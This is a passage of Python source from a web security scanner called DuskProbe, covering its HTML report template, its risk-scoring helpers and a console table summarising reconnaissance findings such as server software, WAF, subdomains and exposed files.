            box-shadow: var(--box-shadow);
        }}
        
        .tech-grid {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
            margin-top: 25px;
        }}
        
        .tech-card {{
            background: linear-gradient(135deg, #f8f9fa, #ffffff);
            border-radius: var(--border-radius);
            padding: 20px;
            border-left: 5px solid var(--accent-color);
        }}
        
        .tech-label {{
            font-weight: 600;
            color: var(--primary-color);
            margin-bottom: 8px;
            display: flex;
            align-items: center;
            gap: 8px;
        }}
        
        .tech-value {{
            font-size: 1.1em;
            color: var(--dark-text);
        }}
        
        /* OWASP & Compliance Section */
        .compliance-section {{
            background: white;
            border-radius: var(--border-radius);
            padding: 35px;
            margin-bottom: 30px;
            box-shadow: var(--box-shadow);
        }}
        
        .owasp-grid {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin-top: 25px;
        }}
        
        .owasp-card {{
            background: linear-gradient(135deg, #fff3cd, #fef3c7);
            border: 2px solid var(--warning-color);
            border-radius: var(--border-radius);
            padding: 20px;
            text-align: center;
        }}
        
        .owasp-category {{
            font-weight: 600;
            margin-bottom: 10px;
            color: var(--primary-color);
        }}
        
        .owasp-count {{
            font-family: 'Bungee', cursive;
            font-size: 2em;
            color: var(--warning-color);
        }}
        
        /* Remediation Section */
        .remediation-section {{
            background: white;
            border-radius: var(--border-radius);
            padding: 35px;
            margin-bottom: 30px;
            box-shadow: var(--box-shadow);
        }}
        
        .remediation-item {{
            background: linear-gradient(135deg, #f8f9fa, #ffffff);
            border-radius: var(--border-radius);
            padding: 20px;
            margin-bottom: 20px;
            border-left: 5px solid var(--highlight-color);
        }}
        
        .remediation-priority {{
            font-weight: 600;
            color: var(--danger-color);
            margin-bottom: 10px;
        }}
        
        .remediation-description {{
            color: var(--dark-text);
            line-height: 1.6;
        }}
        
        /* Footer */
        .report-footer {{
            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
            color: white;
            border-radius: var(--border-radius);
            padding: 30px;
            text-align: center;
            box-shadow: var(--box-shadow);
            margin-top: 30px;
        }}
        
        .footer-brand {{
            font-family: 'Bungee', cursive;
            font-size: 1.5em;
            margin-bottom: 15px;
        }}
        
        .footer-disclaimer {{
            background: rgba(255, 255, 255, 0.1);
            border-radius: var(--border-radius);
            padding: 20px;
            margin-top: 20px;
            font-size: 0.9em;
            line-height: 1.6;
        }}
        
        /* Responsive Design */
        @media (max-width: 768px) {{
            .container {{ padding: 0 15px; }}
            .report-title {{ font-size: 2.2em; }}
            .report-subtitle {{ font-size: 1.1em; }}
            .section-title {{ font-size: 1.6em; }}
            .summary-grid {{ grid-template-columns: 1fr; }}
            .tech-grid {{ grid-template-columns: 1fr; }}
            .owasp-grid {{ grid-template-columns: 1fr; }}
            .vuln-table {{ font-size: 0.9em; }}
        }}
        
        /* Print Styles */
        @media print {{
            body {{ background: white; }}
            .report-header, .executive-summary, .vulnerabilities-section,
            .tech-intelligence, .compliance-section, .remediation-section {{
                background: white !important;
                box-shadow: none !important;
                border: 1px solid #ddd;
            }}
        }}
    </style>
</head>
<body>
    <div class="container">
        <!-- Header Section -->
        <div class="report-header">
            <div class="header-content">
                <h1 class="report-title">🛡️ DUSKPROBE</h1>
                <div class="report-subtitle">ENTERPRISE SECURITY ASSESSMENT REPORT</div>
                
                <div class="scan-metadata">
                    <div class="metadata-card">
                        <div class="metadata-label"><i class="fas fa-globe"></i> Target URL</div>
                        <div class="metadata-value">{target_url}</div>
                    </div>
                    <div class="metadata-card">
                        <div class="metadata-label"><i class="fas fa-calendar"></i> Scan Date</div>
                        <div class="metadata-value">{scan_time}</div>
                    </div>
                    <div class="metadata-card">
                        <div class="metadata-label"><i class="fas fa-shield-alt"></i> Security Posture</div>
                        <div class="metadata-value">{security_posture}</div>
                    </div>
                    <div class="metadata-card">
                        <div class="metadata-label"><i class="fas fa-server"></i> IP Address</div>
                        <div class="metadata-value">{ip_address}</div>
                    </div>
                </div>
            </div>
        </div>
        
        <!-- Executive Summary -->
        <div class="executive-summary">
            <h2 class="section-title">
                <i class="fas fa-chart-line"></i>
                EXECUTIVE SUMMARY
            </h2>
            
            <div class="summary-grid">
                <div class="summary-card critical">
                    <div class="summary-icon" style="color: var(--danger-color);">
                        <i class="fas fa-exclamation-triangle"></i>
                    </div>
                    <div class="summary-title">Critical Vulnerabilities</div>
                    <div class="summary-value" style="color: var(--danger-color);">{severity_counts.get('CRITICAL', 0)}</div>
                    <div class="summary-description">Immediate action required</div>
                </div>
                
                <div class="summary-card high">
                    <div class="summary-icon" style="color: var(--warning-color);">
                        <i class="fas fa-fire"></i>
                    </div>
                    <div class="summary-title">High Risk Issues</div>
                    <div class="summary-value" style="color: var(--warning-color);">{severity_counts.get('HIGH', 0)}</div>
                    <div class="summary-description">Priority remediation needed</div>
                </div>
                
                <div class="summary-card medium">
                    <div class="summary-icon" style="color: var(--info-color);">
                        <i class="fas fa-info-circle"></i>
                    </div>
                    <div class="summary-title">Medium Risk Issues</div>
                    <div class="summary-value" style="color: var(--info-color);">{severity_counts.get('MEDIUM', 0)}</div>
                    <div class="summary-description">Scheduled remediation</div>
                </div>
                
                <div class="summary-card low">
                    <div class="summary-icon" style="color: var(--success-color);">
                        <i class="fas fa-check-circle"></i>
                    </div>
                    <div class="summary-title">Low Risk Issues</div>
                    <div class="summary-value" style="color: var(--success-color);">{severity_counts.get('LOW', 0)}</div>
                    <div class="summary-description">Routine maintenance</div>
                </div>
                
                <div class="summary-card">
                    <div class="summary-icon" style="color: var(--primary-color);">
                        <i class="fas fa-bug"></i>
                    </div>
                    <div class="summary-title">Total Vulnerabilities</div>
                    <div class="summary-value" style="color: var(--primary-color);">{total_vulns}</div>
                    <div class="summary-description">Security issues detected</div>
                </div>
                
                <div class="summary-card">
                    <div class="summary-icon" style="color: var(--accent-color);">
                        <i class="fas fa-percentage"></i>
                    </div>
                    <div class="summary-title">Risk Level</div>
                    <div class="summary-value" style="color: var(--accent-color);">{self._get_overall_risk_level()}</div>
                    <div class="summary-description">Overall security rating</div>
                </div>
            </div>
        </div>
        
        <!-- Technical Intelligence -->
        <div class="tech-intelligence">
            <h2 class="section-title">
                <i class="fas fa-microchip"></i>
                TECHNICAL INTELLIGENCE
            </h2>
            
            <div class="tech-grid">
                <div class="tech-card">
                    <div class="tech-label">
                        <i class="fas fa-server"></i>
                        Server Software
                    </div>
                    <div class="tech-value">{server_software}</div>
                </div>
                
                <div class="tech-card">
                    <div class="tech-label">
                        <i class="fas fa-code"></i>
                        Programming Language
                    </div>
                    <div class="tech-value">{programming_language}</div>
                </div>
                
                <div class="tech-card">
                    <div class="tech-label">
                        <i class="fas fa-cogs"></i>
                        CMS Platform
                    </div>
                    <div class="tech-value">{cms_platform}</div>
                </div>
                
                <div class="tech-card">
                    <div class="tech-label">
                        <i class="fas fa-network-wired"></i>
                        IP Address
                    </div>
                    <div class="tech-value">{ip_address}</div>
                </div>
            </div>
        </div>
        
        <!-- OWASP Compliance -->
        <div class="compliance-section">
            <h2 class="section-title">
                <i class="fas fa-shield-alt"></i>
                OWASP 2025 COMPLIANCE ANALYSIS
            </h2>
            
            <div class="owasp-grid">"""
            
            # Add OWASP categories
            for category, count in owasp_categories.items():
                if count > 0:
                    html_content += f"""
                <div class="owasp-card">
                    <div class="owasp-category">{category}</div>
                    <div class="owasp-count">{count}</div>
                </div>"""
            
            html_content += """
            </div>
        </div>
        
        <!-- Detailed Vulnerability Analysis -->
        <div class="vulnerabilities-section">
            <h2 class="section-title">
                <i class="fas fa-bug"></i>
                DETAILED VULNERABILITY ANALYSIS
            </h2>
            
            <table class="vuln-table">
                <thead>
                    <tr>
                        <th><i class="fas fa-exclamation-circle"></i> Severity</th>
                        <th><i class="fas fa-bug"></i> Vulnerability Type</th>
                        <th><i class="fas fa-tachometer-alt"></i> CVSS Score</th>
                        <th><i class="fas fa-shield-alt"></i> OWASP Category</th>
                        <th><i class="fas fa-cog"></i> Technical Details</th>
                        <th><i class="fas fa-tools"></i> Remediation</th>
                        <th><i class="fas fa-crosshairs"></i> Attack Vector</th>
                        <th><i class="fas fa-business-time"></i> Business Impact</th>
                    </tr>
                </thead>
                <tbody>"""
            
            # Add comprehensive vulnerability rows
            for finding in self.findings:
                severity = finding.get('severity', 'Unknown').upper()
                vuln_type = finding.get('type', 'N/A')
                cvss_score = finding.get('cvss_score', 'N/A')
                owasp_category = finding.get('owasp_category', 'N/A')
                technical_details = finding.get('technical_details', 'N/A')
                remediation_steps = finding.get('remediation_steps', 'N/A')
                attack_vector = finding.get('attack_vector', 'N/A')
                business_impact = finding.get('business_impact', 'N/A')
                cve_references = ', '.join(finding.get('cve_references', []))
                affected_url = finding.get('url', 'N/A')
                
                badge_class = f"badge-{severity.lower()}" if severity.lower() in ['critical', 'high', 'medium', 'low'] else 'badge-unknown'
                
                html_content += f"""
                    <tr>
                        <td><span class="severity-badge {badge_class}">
                            <i class="fas fa-exclamation-triangle"></i> {severity}
                        </span></td>
                        <td><strong>{vuln_type}</strong><br>
                            <small style="color: #666;">CVE: {cve_references[:50]}{'...' if len(cve_references) > 50 else ''}</small></td>
                        <td><strong>{cvss_score}</strong></td>
                        <td>{owasp_category}</td>
                        <td>{technical_details}<br>
                            <small style="color: #666;">URL: {affected_url[:40]}{'...' if len(affected_url) > 40 else ''}</small></td>
                        <td>{remediation_steps}</td>
                        <td><span style="padding: 4px 8px; background: #e9ecef; border-radius: 4px; font-size: 0.8em;">{attack_vector}</span></td>
                        <td>{business_impact}</td>
                    </tr>"""
            
            html_content += """
                </tbody>
            </table>
        </div>
        
        <!-- Remediation Recommendations -->
        <div class="remediation-section">
            <h2 class="section-title">
                <i class="fas fa-tools"></i>
                PRIORITY REMEDIATION RECOMMENDATIONS
            </h2>"""
            
            # Group vulnerabilities by type for remediation
            vuln_types = {}
            for finding in self.findings:
                vuln_type = finding.get('type', 'Unknown')
                if vuln_type not in vuln_types:
                    vuln_types[vuln_type] = []
                vuln_types[vuln_type].append(finding)
            
            priority_order = ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW']
            
            for vuln_type, vulns in vuln_types.items():
                count = len(vulns)
                highest_severity = max([v.get('severity', 'LOW') for v in vulns], key=lambda x: priority_order.index(x) if x in priority_order else 999)
                remediation = vulns[0].get('remediation_steps', 'Implement security best practices')
                
                html_content += f"""
            <div class="remediation-item">
                <div class="remediation-priority">
                    <i class="fas fa-exclamation-triangle"></i>
                    {vuln_type} ({count} instance{'s' if count > 1 else ''}) - {highest_severity} Priority
                </div>
                <div class="remediation-description">
                    <strong>Recommended Action:</strong> {remediation}
                </div>
            </div>"""
            
            html_content += """
        </div>
        
        <!-- Footer -->
        <div class="report-footer">
            <div class="footer-brand">
                <i class="fas fa-shield-alt"></i>
                DUSKPROBE v5.0
            </div>
            <p>Enterprise Security Assessment Platform</p>
            <p>© 2025 Labib Bin Shahed. All rights reserved.</p>
            
            <div class="footer-disclaimer">
                <i class="fas fa-exclamation-triangle"></i>
                <strong>CONFIDENTIAL SECURITY REPORT</strong><br>
                This document contains sensitive security information and should be handled according to your organization's data classification policies. 
                Distribution should be limited to authorized personnel only. Use this information responsibly and only for legitimate security improvement purposes.
            </div>
        </div>
    </div>
    
    <script>
        // Add some interactive features
        document.addEventListener('DOMContentLoaded', function() {{
            // Animate summary cards on load
            const cards = document.querySelectorAll('.summary-card');
            cards.forEach((card, index) => {{
                setTimeout(() => {{
                    card.style.opacity = '0';
                    card.style.transform = 'translateY(20px)';
                    card.style.transition = 'all 0.6s ease';
                    setTimeout(() => {{
                        card.style.opacity = '1';
                        card.style.transform = 'translateY(0)';
                    }}, 100);
                }}, index * 100);
            }});
            
            // Add click-to-expand functionality for technical details
            const techCells = document.querySelectorAll('.vuln-table td');
            techCells.forEach(cell => {{
                if (cell.textContent.length > 100) {{
                    cell.style.cursor = 'pointer';
                    cell.title = 'Click to expand';
                    cell.addEventListener('click', function() {{
                        this.style.whiteSpace = this.style.whiteSpace === 'normal' ? 'nowrap' : 'normal';
                        this.style.overflow = this.style.overflow === 'visible' ? 'hidden' : 'visible';
                    }});
                }}
            }});
        }});
    </script>
</body>
</html>"""
            
            # Write the comprehensive HTML content to file
            with open(output_path, 'w', encoding='utf-8') as f:
                f.write(html_content)
                
        except Exception as e:
            self.console.print(f"❌ [bold red]Error generating professional HTML report:[/bold red] {e}")
            # Fallback to basic HTML if advanced generation fails
            if hasattr(self, 'df') and self.df is not None:
                self.df.to_html(output_path, index=False, border=1, classes='table table-striped')

    def _get_overall_risk_level(self):
        """Calculate overall risk level based on vulnerability distribution."""
        severity_counts = {}
        for finding in self.findings:
            severity = finding.get('severity', 'Unknown').upper()
            severity_counts[severity] = severity_counts.get(severity, 0) + 1
        
        if severity_counts.get('CRITICAL', 0) > 0:
            return 'CRITICAL'
        elif severity_counts.get('HIGH', 0) >= 3:
            return 'HIGH'
        elif severity_counts.get('HIGH', 0) > 0 or severity_counts.get('MEDIUM', 0) >= 5:
            return 'MEDIUM'
        else:
            return 'LOW'
    
    def _calculate_risk_percentage(self):
        """Calculate risk percentage for visual risk meter."""
        total_vulns = len(self.findings)
        if total_vulns == 0:
            return 10
        
        severity_counts = {}
        for finding in self.findings:
            severity = finding.get('severity', 'Unknown').upper()
            severity_counts[severity] = severity_counts.get(severity, 0) + 1
        
        # Weight severities differently
        risk_score = (
            severity_counts.get('CRITICAL', 0) * 25 +
            severity_counts.get('HIGH', 0) * 15 +
            severity_counts.get('MEDIUM', 0) * 8 +
            severity_counts.get('LOW', 0) * 3
        )
        
        # Cap at 100%
        return min(100, max(10, risk_score))

    def _display_technical_intelligence(self):
        """Display comprehensive technical reconnaissance information."""
        if not hasattr(self, 'site_info') or not self.site_info:
            return
        
        # Create comprehensive technical information table with enhanced details
        table = Table(title="🕵️ Enhanced Technical Intelligence & Reconnaissance Report", show_header=True, header_style="bold cyan")
        table.add_column("Category", style="bold blue", width=25)
        table.add_column("Technology/Component", style="bold yellow", width=30)
        table.add_column("Details & Affected URLs", style="white", width=35)
        table.add_column("Security Notes", style="bold red", width=35)
        table.add_column("Risk Level", style="bold magenta", width=12)
        table.add_column("Additional Info", style="cyan", width=20)

        # 🖥️ Server & Hosting Information
        if any(key.startswith('server_') or key in ['cloud_provider', 'cdn_detected', 'waf_detected', 'hosting_environment'] for key in self.site_info.keys()):
            # Server Software with enhanced details
            server_software = self.site_info.get('server_software', 'Unknown')
            base_url = self.site_info.get('url', 'N/A')
            server_version = self.site_info.get('server_version', 'Unknown')
            table.add_row(
                "🖥️ Server Software", 
                f"{server_software}\nVersion: {server_version}",
                f"Web server technology running the application\n🌐 Base URL: {base_url}\n📍 Headers exposed: Server header",
                "Check for known vulnerabilities in server version" if server_software != 'Unknown' else "Server software hidden - security by obscurity",
                "🟡 MEDIUM" if server_software != 'Unknown' else "🟢 LOW",
                f"Fingerprint: {server_software[:10]}..." if len(server_software) > 10 else server_software
            )
            
            # IP Address & Infrastructure with geolocation
            ip_address = self.site_info.get('ip_address', 'Unknown')
            hosting_country = self.site_info.get('hosting_country', 'Unknown')
            isp = self.site_info.get('isp', 'Unknown')
            table.add_row(
                "🌐 IP Address", 
                f"{ip_address}\nISP: {isp}",
                f"Primary server IP address\n🌍 Location: {hosting_country}\n📍 All endpoints resolve to this IP",
                "Public IP exposure analysis required" if ip_address != 'Unknown' else "IP resolution failed",
                "🟡 MEDIUM" if ip_address != 'Unknown' else "🔴 HIGH",
                f"Geo: {hosting_country}" if hosting_country != 'Unknown' else "Unknown location"
            )
            
            # Cloud Provider with service details
            cloud_provider = self.site_info.get('cloud_provider', 'Unknown')
            hosting_service = self.site_info.get('hosting_service', 'Unknown')
            table.add_row(
                "☁️ Cloud Provider", 
                f"{cloud_provider}\nService: {hosting_service}",
                f"Hosting infrastructure provider\n🔗 Service endpoints: {base_url}\n📊 Infrastructure metadata exposed",
                "Review cloud security configurations" if cloud_provider != 'Unknown' else "Self-hosted or unknown provider",
                "🟡 MEDIUM" if cloud_provider != 'Unknown' else "🟢 LOW",
                f"Platform: {cloud_provider}" if cloud_provider != 'Unknown' else "On-premise"
            )
            
            # CDN Detection with endpoints
            cdn_detected = self.site_info.get('cdn_detected', 'Not detected')
            cdn_provider = self.site_info.get('cdn_provider', 'N/A')
            table.add_row(
                "🚀 CDN Usage", 
                f"{cdn_detected}\nProvider: {cdn_provider}",
                f"Content Delivery Network implementation\n🌐 CDN endpoints: {base_url}\n⚡ Edge servers detected",
                "CDN bypassing techniques may be possible" if cdn_detected != 'Not detected' else "No CDN protection - direct server access",
                "🟢 LOW" if cdn_detected != 'Not detected' else "🟡 MEDIUM",
                f"Edge locations: {'Multiple' if cdn_detected != 'Not detected' else 'None'}"
            )
            
            # Web Application Firewall with bypass info
            waf_detected = self.site_info.get('waf_detected', 'Not detected')
            waf_vendor = self.site_info.get('waf_vendor', 'N/A')
            table.add_row(
                "🛡️ WAF Detection", 
                f"{waf_detected}\nVendor: {waf_vendor}",
                f"Web Application Firewall protection\n🔗 Protected endpoints: {base_url}\n🛡️ Filter rules detected",
                "WAF bypass techniques required for testing" if waf_detected != 'Not detected' else "No WAF protection detected - direct application access",
                "🟢 LOW" if waf_detected != 'Not detected' else "🔴 HIGH",
                f"Vendor: {waf_vendor}" if waf_vendor != 'N/A' else "Unknown vendor"
            )

        # 🧱 Backend Stack Information with detailed component URLs
        if any(key.startswith('programming_') or key in ['web_framework', 'database_hints', 'application_server'] for key in self.site_info.keys()):
            # Programming Language
            programming_language = self.site_info.get('programming_language', 'Unknown')
            language_version = self.site_info.get('language_version', 'Unknown')
            framework_endpoints = self.site_info.get('framework_endpoints', [])
            table.add_row(
                "💻 Programming Language", 
                f"{programming_language}\nVersion: {language_version}",
                f"Backend development language\n🔗 Framework hints: {', '.join(framework_endpoints[:2]) if framework_endpoints else 'N/A'}\n📁 Language-specific paths detected",
                "Language-specific vulnerability research required" if programming_language != 'Unknown' else "Programming language hidden",
                "🟡 MEDIUM" if programming_language != 'Unknown' else "🟢 LOW",
                f"Runtime: {programming_language}" if programming_language != 'Unknown' else "Unknown runtime"
            )
            
            # Web Framework
            web_framework = self.site_info.get('web_framework', 'Unknown')
            framework_version = self.site_info.get('framework_version', 'Unknown')
            admin_urls = self.site_info.get('admin_urls', [])
            table.add_row(
                "🧱 Web Framework", 
                f"{web_framework}\nVersion: {framework_version}",
                f"Application development framework\n🔗 Admin interfaces: {', '.join(admin_urls[:2]) if admin_urls else 'None detected'}\n⚙️ Framework-specific paths found",
                "Framework-specific security assessment needed" if web_framework != 'Unknown' else "Framework not identified",
                "🟡 MEDIUM" if web_framework != 'Unknown' else "🟢 LOW",
                f"Framework: {web_framework[:10]}..." if len(web_framework) > 10 else web_framework
            )
            
            # Database Technology
            database_hints = self.site_info.get('database_hints', [])
            db_endpoints = self.site_info.get('database_endpoints', [])
            if database_hints:
                table.add_row(
                    "🗄️ Database Technology", 
                    f"{', '.join(database_hints)}\nEndpoints: {len(db_endpoints)} found",
                    f"Backend database systems detected\n🔗 DB interfaces: {', '.join(db_endpoints[:2]) if db_endpoints else 'None exposed'}\n💾 Database fingerprinting successful",
                    "Database-specific injection testing required",
                    "🔴 HIGH" if db_endpoints else "🟡 MEDIUM",
                    f"DB Count: {len(database_hints)}"
                )
            
            # Application Server
            application_server = self.site_info.get('application_server', 'Unknown')
            server_modules = self.site_info.get('server_modules', [])
            table.add_row(
                "⚙️ Application Server", 
                f"{application_server}\nModules: {len(server_modules)} detected",
                f"Web application server software\n🔧 Server modules: {', '.join(server_modules[:2]) if server_modules else 'None detected'}\n⚙️ Configuration exposed",
                "Server-specific configuration review needed" if application_server != 'Unknown' else "Application server not identified",
                "🟡 MEDIUM" if application_server != 'Unknown' else "🟢 LOW",
                f"Modules: {len(server_modules)}"
            )

        # 🎨 Frontend Stack Information with asset URLs
        if any(key.startswith('js_') or key.startswith('css_') or key in ['build_tools', 'ui_libraries'] for key in self.site_info.keys()):
            # JavaScript Frameworks
            js_frameworks = self.site_info.get('js_frameworks', [])
            js_assets = self.site_info.get('js_assets', [])
            if js_frameworks:
                table.add_row(
                    "⚛️ JavaScript Frameworks", 
                    f"{', '.join(js_frameworks)}\nAssets: {len(js_assets)} files",
                    f"Client-side JavaScript frameworks\n🔗 JS assets: {', '.join(js_assets[:2]) if js_assets else 'None found'}\n📜 Framework libraries detected",
                    "Client-side security vulnerabilities possible",
                    "🟡 MEDIUM" if js_frameworks else "🟢 LOW",
                    f"JS Files: {len(js_assets)}"
                )
            
            # CSS Frameworks
            css_frameworks = self.site_info.get('css_frameworks', [])
            css_assets = self.site_info.get('css_assets', [])
            if css_frameworks:
                table.add_row(
                    "🎨 CSS Frameworks", 
                    f"{', '.join(css_frameworks)}\nAssets: {len(css_assets)} files",
                    f"Styling and UI frameworks\n🔗 CSS assets: {', '.join(css_assets[:2]) if css_assets else 'None found'}\n🎨 Stylesheet frameworks detected",
                    "Framework-specific XSS vectors possible",
                    "🟢 LOW",
                    f"CSS Files: {len(css_assets)}"
                )
            
            # Build Tools
            build_tools = self.site_info.get('build_tools', [])
            build_artifacts = self.site_info.get('build_artifacts', [])
            if build_tools:
                table.add_row(
                    "🔧 Build Tools", 
                    f"{', '.join(build_tools)}\nArtifacts: {len(build_artifacts)} files",
                    f"Frontend build and bundling tools\n🔗 Build files: {', '.join(build_artifacts[:2]) if build_artifacts else 'None exposed'}\n🛠️ Development artifacts found",
                    "Source map exposure and build artifacts",
                    "🟡 MEDIUM" if build_artifacts else "🟢 LOW",
                    f"Tools: {len(build_tools)}"
                )
            
            # UI Libraries
            ui_libraries = self.site_info.get('ui_libraries', [])
            ui_assets = self.site_info.get('ui_assets', [])
            if ui_libraries:
                table.add_row(
                    "📚 UI Libraries", 
                    f"{', '.join(ui_libraries)}\nAssets: {len(ui_assets)} files",
                    f"User interface component libraries\n🔗 UI assets: {', '.join(ui_assets[:2]) if ui_assets else 'None found'}\n🧩 Component libraries detected",
                    "Component-specific vulnerabilities assessment",
                    "🟢 LOW",
                    f"UI Files: {len(ui_assets)}"
                )

        # 🌐 Network & Protocol Information with endpoint details
        if any(key.startswith('http_') or key.startswith('protocol_') or key in ['open_ports', 'security_headers'] for key in self.site_info.keys()):
            # HTTP Version
            http_version = self.site_info.get('http_version', 'HTTP/1.1')
            http_methods = self.site_info.get('http_methods', [])
            table.add_row(
                "🌐 HTTP Version", 
                f"{http_version}\nMethods: {', '.join(http_methods[:3]) if http_methods else 'Standard'}",
                f"HTTP protocol version in use\n🔗 Supported methods: {', '.join(http_methods) if http_methods else 'GET, POST, HEAD'}\n⚡ Protocol capabilities detected",
                "HTTP/1.1 may have performance limitations" if http_version == 'HTTP/1.1' else "Modern HTTP version",
                "🟡 MEDIUM" if http_version == 'HTTP/1.1' else "🟢 LOW",
                f"Methods: {len(http_methods)}"
            )
            
            # Protocol Security
            protocol_security = self.site_info.get('protocol_security', {})
            if protocol_security:
                https_enabled = protocol_security.get('https_enabled', False)
                tls_version = protocol_security.get('tls_version', 'Unknown')
                cert_info = protocol_security.get('cert_info', 'Unknown')
                table.add_row(
                    "🔒 HTTPS Status", 
                    f"{'Enabled' if https_enabled else 'Disabled'}\nTLS: {tls_version}",
                    f"Secure communication protocol\n🔐 Certificate: {cert_info}\n🛡️ Encryption status verified",
                    "Strong encryption in use" if https_enabled else "CRITICAL: No encryption - data transmitted in plaintext",
                    "🟢 LOW" if https_enabled else "🔴 CRITICAL",
                    f"TLS: {tls_version}"
                )
            
            # Open Ports
            open_ports = self.site_info.get('open_ports', [])
            port_services = self.site_info.get('port_services', {})
            if open_ports:
                table.add_row(
                    "🔌 Open Ports", 
                    f"{', '.join(map(str, open_ports))}\nServices: {len(port_services)} identified",
                    f"Accessible network ports\n🔗 Service mapping: {', '.join(f'{k}:{v}' for k, v in list(port_services.items())[:2])}\n🌐 Network attack surface mapped",
                    "Additional attack surface available",
                    "🟡 MEDIUM" if len(open_ports) > 3 else "🟢 LOW",
                    f"Ports: {len(open_ports)}"
                )
            
            # Security Headers Analysis
            security_headers = self.site_info.get('security_headers', {})
            if security_headers:
                missing_headers = [k for k, v in security_headers.items() if v == 'Missing']
                present_headers = [k for k, v in security_headers.items() if v != 'Missing']
                if missing_headers:
                    table.add_row(
                        "🛡️ Security Headers", 
                        f"{len(missing_headers)} Missing\nPresent: {len(present_headers)}",
                        f"Missing headers analysis\n❌ Missing: {', '.join(missing_headers[:3])}\n✅ Present: {', '.join(present_headers[:2])}",
                        "Critical security headers missing - increased vulnerability risk",
                        "🔴 HIGH" if len(missing_headers) > 4 else "🟡 MEDIUM",
                        f"Score: {len(present_headers)}/{len(security_headers)}"
                    )

        # 🕵️ Reconnaissance & Intelligence with source URLs
        if any(key.startswith('directory_') or key.startswith('subdomain_') or key in ['email_addresses', 'sensitive_files', 'technology_fingerprint'] for key in self.site_info.keys()):
            # Directory Enumeration
            directory_enum = self.site_info.get('directory_enum', {})
            directory_sources = self.site_info.get('directory_sources', [])
            if directory_enum and isinstance(directory_enum, dict):
                existing_dirs = directory_enum.get('existing_directories', [])
                if existing_dirs:
                    dir_urls = [d.get('url', '') for d in existing_dirs if isinstance(d, dict)]
                    table.add_row(
                        "📁 Discovered Directories", 
                        f"{len(existing_dirs)} directories\nSources: {len(directory_sources)} methods",
                        f"Accessible directory paths\n🔗 Top directories: {', '.join(dir_urls[:3])}\n📂 Discovery methods: {', '.join(directory_sources[:2]) if directory_sources else 'Brute force'}",
                        "Potential sensitive information exposure",
                        "🟡 MEDIUM" if len(existing_dirs) > 10 else "🟢 LOW",
                        f"Dirs: {len(existing_dirs)}"
                    )
            elif isinstance(directory_enum, list) and directory_enum:
                table.add_row(
                    "📁 Discovered Directories", 
                    f"{len(directory_enum)} directories\nSources: {len(directory_sources)} methods",
                    f"Accessible directory paths\n🔗 Top directories: {', '.join(directory_enum[:3])}\n📂 Discovery methods: {', '.join(directory_sources[:2]) if directory_sources else 'Brute force'}",
                    "Potential sensitive information exposure",
                    "🟡 MEDIUM" if len(directory_enum) > 10 else "🟢 LOW",
                    f"Dirs: {len(directory_enum)}"
                )
            
            # Subdomain Discovery
            subdomain_discovery = self.site_info.get('subdomain_discovery', [])
            subdomain_sources = self.site_info.get('subdomain_sources', [])
            if subdomain_discovery:
                table.add_row(
                    "🌐 Subdomains", 
                    f"{len(subdomain_discovery)} subdomains\nSources: {len(subdomain_sources)} methods",
                    f"Associated subdomains discovered\n🔗 Active subdomains: {', '.join(subdomain_discovery[:3])}\n🔍 Discovery sources: {', '.join(subdomain_sources[:2]) if subdomain_sources else 'DNS enumeration'}",
                    "Extended attack surface - additional testing required",
                    "🔴 HIGH" if len(subdomain_discovery) > 5 else "🟡 MEDIUM",
                    f"Subs: {len(subdomain_discovery)}"
                )
            
            # Email Addresses
            email_addresses = self.site_info.get('email_addresses', [])
            email_sources = self.site_info.get('email_sources', [])
            if email_addresses:
                table.add_row(
                    "📧 Email Addresses", 
                    f"{len(email_addresses)} addresses\nSources: {len(email_sources)} methods",
                    f"Contact information exposed\n📧 Sample emails: {', '.join(email_addresses[:3])}\n🔍 Found via: {', '.join(email_sources[:2]) if email_sources else 'Web scraping'}",
                    "Social engineering and phishing targets",
                    "🟡 MEDIUM" if len(email_addresses) > 3 else "🟢 LOW",
                    f"Emails: {len(email_addresses)}"
                )
            
            # Sensitive Files
            sensitive_files = self.site_info.get('sensitive_files', [])
            sensitive_urls = self.site_info.get('sensitive_urls', [])
            if sensitive_files:
                table.add_row(
                    "🔍 Sensitive Files", 
                    f"{len(sensitive_files)} files exposed\nTypes: {len(set(f.split('.')[-1] for f in sensitive_files if '.' in f))} formats",
                    f"Publicly accessible sensitive files\n🔗 File URLs: {', '.join(sensitive_urls[:2]) if sensitive_urls else 'Multiple locations'}\n⚠️ Data exposure detected",
                    "CRITICAL: Sensitive information exposure",
                    "🔴 CRITICAL",
                    f"Files: {len(sensitive_files)}"
                )
            
            # Technology Fingerprint
            tech_fingerprint = self.site_info.get('technology_fingerprint', {})
            if tech_fingerprint:
                cms_detected = tech_fingerprint.get('cms_detected', 'Unknown')
                cms_version = tech_fingerprint.get('cms_version', 'Unknown')
                cms_plugins = tech_fingerprint.get('cms_plugins', [])
                if cms_detected != 'Unknown':
                    table.add_row(
                        "🏗️ CMS Platform", 
                        f"{cms_detected}\nVersion: {cms_version}\nPlugins: {len(cms_plugins)} detected",
                        f"Content Management System\n🔗 CMS admin: {base_url}/admin\n🧩 Plugin vulnerabilities: {len(cms_plugins)} components",
                        "CMS-specific vulnerability assessment required",
                        "🔴 HIGH" if cms_plugins else "🟡 MEDIUM",
                        f"Plugins: {len(cms_plugins)}"
                    )
            
            # API Discovery
            api_endpoints = self.site_info.get('api_endpoints', [])
            api_versions = self.site_info.get('api_versions', [])
            if api_endpoints:
                table.add_row(
                    "🔌 API Endpoints", 
                    f"{len(api_endpoints)} endpoints\nVersions: {', '.join(api_versions) if api_versions else 'Unknown'}",
                    f"Application Programming Interfaces\n🔗 API paths: {', '.join(api_endpoints[:3])}\n⚙️ REST/GraphQL endpoints detected",
                    "API security testing required",
                    "🟡 MEDIUM",
                    f"APIs: {len(api_endpoints)}"
                )

        # Additional Technical Intelligence with enhanced metrics
        assessment_score = self._calculate_assessment_score()
        completion_status = self._get_completion_status()
        table.add_row(
            "🎯 Assessment Status", 
            f"{completion_status}\nScore: {assessment_score}/100",
            f"Comprehensive reconnaissance completed\n📊 Coverage: {len([k for k, v in self.site_info.items() if v])}/{len(self.site_info)} modules\n✅ All intelligence gathering modules executed",
            "Ready for targeted vulnerability testing and exploitation assessment",
            "🟢 LOW",
            f"Modules: {len([k for k, v in self.site_info.items() if v])}"
        )

        # Display the technical intelligence table
